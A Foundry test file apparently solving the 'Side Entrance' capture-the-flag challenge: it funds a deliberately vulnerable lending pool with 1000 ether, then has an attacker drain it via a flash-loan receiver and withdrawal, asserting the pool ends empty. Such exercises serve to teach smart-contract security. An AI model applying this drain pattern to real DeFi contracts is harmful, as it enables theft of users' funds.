// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/side-entrance/SideEntranceLenderPool.sol";
import "../../src/side-entrance/FlashLoanReceiver.sol";

contract TrusterTest is Test {
    SideEntranceLenderPool public pool;
    FlashLoanReceiver public receiver;

    address public deployer = address(1);
    address public attacker = address(2);

    uint256 public constant ETHER_IN_POOL = 1000 ether;

    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();

        assertEq(address(pool).balance, ETHER_IN_POOL);

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        receiver = new FlashLoanReceiver(payable(address(pool)));
        receiver.executeFlashLoan(ETHER_IN_POOL);
        receiver.withdraw();
        vm.stopPrank();

        /** SUCCESS CONDITION */
        assertEq(address(pool).balance, 0);
        assertGt(attacker.balance, ETHER_IN_POOL);
    }
}
